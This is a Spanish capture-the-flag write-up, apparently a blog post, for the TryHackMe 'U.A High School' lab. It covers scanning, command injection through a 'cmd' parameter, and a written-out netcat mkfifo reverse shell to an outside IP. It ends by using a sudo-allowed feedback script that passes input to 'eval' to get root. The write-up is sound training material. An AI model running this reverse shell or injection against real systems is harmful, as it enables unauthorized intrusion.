---
title: U.A High School - TryHackMe
layout: post
permalink: /writeups/THM/UA_HighSchool
date: 2025-04-21 11:00:00 -0000
description: >
  Write up en español para U.A High School - TryHackMe
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -sV -Pn -T4 -O 10.10.221.160
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 20:34 CAT
Nmap scan report for 10.10.221.160
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeración de directorios web

Primero intentamos una enumeración de los directorios web, pero no nos muestra nada demasiado interesante.

```bash
gobuster dir -u http://10.10.215.251 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.215.251
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.215.251/assets/]
/index.html           (Status: 200) [Size: 1988]
/server-status        (Status: 403) [Size: 278]
Progress: 4744 / 4745 (99.98%)
===============================================================
Finished
===============================================================
```

Lo único interesante que podemos encontrar es el directorio `/assets/`.

Si visualizamos las peticiones con burpsuite vemos que nos asigna una cookie `PHPSESSID` estilo PHP lo cual no tiene mucho sentido siendo un directorio web para assets y, además muestra una pagina en blanco y no un directorio o simplemente un error.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image.png)

Sabiendo que podemos tener un index.php con alguna función como id, img etc podemos intentar forzar los parámetros.

Usando `dirsearch` obtenemos:

```bash
dirsearch -u http://10.10.215.251/assets/index.php
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/sdksdk/Downloads/reports/http_10.10.215.251/_assets_index.php_25-04-21_22-12-27.txt

Target: http://10.10.215.251/

[22:12:27] Starting: assets/index.php/
[22:12:30] 404 -  275B  - /assets/index.php/%2e%2e//google.com              
[22:12:49] 200 -   40B  - /assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir
                                                                             
Task Completed
```

Parece que tenemos ejecución de comandos con el parámetro **cmd** pero este nos devuelve el contenido en base64.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-1.png)

Sabiendo esto vamos directamente a por una shell reversa.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.23.66.202 4444 >/tmp/f
```

Usaremos una nc mkinfo y la codificaremos en URL.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-2.png)

Ahora podemos estabilizar la shell.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-3.png)

## Explorando el sistema

Encontramos que la user flag está en el usuario deku pero no tenemos acceso.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-4.png)

Explorando el sistema encontramos un directorio `Hidden_Content` que contiene texto cifrado en base64.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-5.png)

Por ahora eso no nos sirve de nada pero lo guardaremos.

Ahora lo único que encontramos interesante son las imágenes en el directorio `Images` de `assets`.

Una vez las descargamos vemos que una de ellas es el fondo de la web pero la otra parece dañada y el visor de imágenes nos muestra el error indicando que no contiene los bytes de cabecera de una imagen jpg.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-6.png)

Si abrimos el fichero con hexedit vemos que los primeros bytes no corresponden a una imagen jpeg sino PNG.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-7.png)

Las imágenes JPEG comienzan con ith FF D8 y terminan en FF D9. En la siguiente [web](https://www.garykessler.net/library/file_sigs.html) podemos encontrar las cabeceras hexadecimales de varios archivos.

Para arreglar el nuestro necesitamos cambiar lo siguiente:

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-8.png)

Ahora si podemos ver la imagen aunque a simple vista no contiene nada.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-9.png)

Aunque puede que tenga contenido oculto usando esteganografía.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-10.png)

Efectivamente tenía contenido oculto y además nos pedía la contraseña que encontramos antes. 

## Acceso por ssh

Ahora con estas crendenciales podemos acceder por ssh.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-11.png)

## Escalando privilegios

```bash
deku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

Vemos que tenemos un script con permisos de ejecución sudo para el usuario deku.

```bash
deku@myheroacademia:~$ cat /opt/NewComponent/feedback.sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

Parece un script para enviar feedbacks a la departamento de tecnología de la universidad.

Según el código toma la entrada del usuario y valida el contenido para evitar que se ejecuten comandos maliciosos.

```bash
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
```

    backticks ` (usados para ejecutar comandos)

    paréntesis de comandos $()

    redirecciones |, ;, &

    signos como ?, !, \

Lo interesante es que aunque existe esta validación, justo despúes de la validación se ejecuta el comando `eval`. Sabiendo esto podemos escribir cualquier contenido como root en cualquier fichero.

### ¿Qué se filtra?
Se rechazan entradas que contengan:

    ` (backtick)

    )

    $( (inicio de comando)

    |

    &

    ;

    ?

    !

    \

Lo que vamos a hacer entonces e crear una clave RSA para acceder por ssh como root desde el usuario deku.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-12.png)

Ejecutamos el siguiente comando

```bash
ssh -i id_rsa root@localhost
```

Y somos root.

![alt text](/assets/img/writeups/tryhackme/uahighschool/image-13.png)